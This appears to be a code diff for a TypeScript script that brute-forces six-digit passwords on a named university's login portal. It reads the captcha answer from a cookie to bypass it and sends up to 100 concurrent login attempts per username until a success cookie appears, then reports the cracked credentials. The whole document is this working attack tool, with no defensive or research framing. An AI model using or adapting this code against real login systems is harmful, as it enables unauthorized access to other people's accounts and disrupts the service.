@@ -1,104 +1,124 @@
 import FormData = require("form-data");
-import fetch from "node-fetch"
+import fetch, { FetchError } from "node-fetch"
 import cheerio = require("cheerio")
+import Utils from "./utils"
+import pQueue from "p-queue"
+import { reject } from "async";
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
 
-export function worker(username:string):Promise<any>{
+
+export function worker(username: string): Promise<any>{
   return new Promise((resolve,reject)=>{
-    let times = 5 // retry times
     let success = false
     let view_state = ""
-    let password = "000000"
-  async function app(){
+    let password = "093500"
+    username = username.toLowerCase()
     log("username: ",username)
-    const mypass = password
-    try {
-      const result = await fetch(baseUrl);
-      if (parseInt(password) > 999999 ) {
-        resolve("failed " + "用户名: " + username + "密码: ")
-        return;
-      }
-      if(success){
-        return 
-      }
-      const cookieJar: string[] = [];
-      const sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
-      cookieJar.push(sessionId);
-      const body = await result.text();
-      const $ = cheerio.load(body);
-      view_state = $("#__VIEWSTATE").val();
-      const imgUrl = body.match(pattern) || [""];
-      const url = baseUrl + imgUrl[0].replace("&amp;", "&");
-      const r = await fetch(url, {
-        headers: {
-          "cookie": cookieJar.join(";")
+        /**
+         * 获取登陆页的html
+         */
+    async function main(){
+      try {
+        const result = await fetch(baseUrl)
+        const cookieJar = new Map()
+        const sessionId = Utils.getCookie(result)
+        cookieJar.set("sessionId",sessionId);
+        const body = await result.text()
+        const $ = cheerio.load(body);
+        view_state = $("#__VIEWSTATE").val();//view state字段
+        const imgUrl = body.match(pattern) || [""];
+        const url = baseUrl + imgUrl[0].replace("&amp;", "&");//验证码url
+        const r = await fetch(url, {
+          headers: {
+            "cookie": Array.from(cookieJar.values()).join(";")
+          }
+        });
+        const validate = Utils.getCookie(r)//验证码
+        cookieJar.set("validate",validate);
+        const validateCode = (validate.match(/[0-9]{4}/) || [""])[0];
+        log("validate code:", validateCode);
+        let sum = 0;
+        validateCode.split("").forEach(val => {
+          sum += parseInt(val);
+        });
+        log("sum:", sum);
+        log("session", cookieJar);
+        const queue = new pQueue({concurrency:100})
+        const tryPass =()=>{
+            const mypass = password
+            password = increase(password)
+            /**
+             * 组装数据
+             */
+            const formData = new FormData();
+            formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
+            formData.append("__VIEWSTATE", view_state);
+            formData.append("winLogin$sfLogin$txtUserLoginID", username);
+            formData.append('winLogin$sfLogin$txtPassword', mypass);
+            formData.append('winLogin$sfLogin$txtValidate', sum + "");
+            
+            return fetch(baseUrl + "default.aspx", {
+              method: "post",
+              headers: {
+                cookie: Array.from(cookieJar.values()).join(";")
+              },
+              body: formData
+            }).then(login=>{
+              /**
+               * iflysse是登陆成功时拿到的cookie值
+               */
+              const iflysse = Utils.getCookie(login)
+              if (iflysse.length === 0) {
+                log("failed ", "password: ", mypass);
+              }
+              else {
+                log("success ", "用户名: ", username, "密码: ", mypass);
+                success = true;
+                resolve("success "+ "用户名: "+ username+ "密码: "+ mypass)
+              }
+              return
+            })
+            .catch(reject)
+          }
+        
+        for(let i=0;i<110;i++){
+          queue.add(
+            tryPass
+          )
         }
-      });
-      const str = r.headers.get("set-cookie") || "";
-      cookieJar.push(str.split(";")[0]);
-      const validateCode = (str.match(/[0-9]{4}/) || [""])[0];
-      log("validate code:", validateCode);
-      let sum = 0;
-      validateCode.split("").forEach(val => {
-        sum += parseInt(val);
-      });
-      log("sum:", sum);
-      log("session", cookieJar);
-      const formData = new FormData();
-      formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
-      formData.append("__VIEWSTATE", view_state);
-      formData.append("winLogin$sfLogin$txtUserLoginID", username);
-      formData.append('winLogin$sfLogin$txtPassword', mypass);
-      formData.append('winLogin$sfLogin$txtValidate', sum + "");
-      const login = await fetch(baseUrl + "default.aspx", {
-        method: "post",
-        headers: {
-          cookie: cookieJar.join(";")
-        },
-        body: formData
-      });
-      const iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
-      if (iflysse.length === 0) {
-        log("failed ", "password: ", mypass);
-        increase();
-        cookieJar.length = 0;
-        app();
-      }
-      else {
-        log("success ", "用户名: ", username, "密码: ", mypass);
-        success = true;
-        resolve( "success " + "用户名: " + username + "密码: "+ mypass)
-        return ;
-      }
-      cookieJar.push(iflysse);
-    }
-    catch (err) {
-      log(err);
-      if(times>0){
-        app();//retry
-        times--
-      }else{
-        reject("用户名"+username+"尝试五次仍失败，请排查："+JSON.stringify(err))
+        queue.on("active",()=>{
+          log("size",queue.size)
+          if(queue.size<100&&!success&&parseInt(password)<=999999){
+            queue.add(
+              tryPass
+            )
+          }else{
+            if(success){
+              queue.pause()
+            }
+            if(parseInt(password)>999999){
+              queue.pause()
+            }
+          }
+        })
+      } catch (error) {
+        log(error)
       }
     }
-  };
-  
-  function increase(){
-    password = ""+(parseInt(password)+1)
-    if(password.length<6){
-      const len = password.length
+    main()
+  })
+}  
+    
+    
+  function increase(num: string){
+    num = ""+(parseInt(num)+1)
+    if(num.length<6){
+      const len = num.length
       for(let i=0;i<6-len;i++){
-        password = 0+password
+        num = 0+num
       }
     }
+    return num
   }
-  //控制并发量
-  for(let i=0;i<100;i++){
-    increase()
-    app()
-  }
-})
-
-}
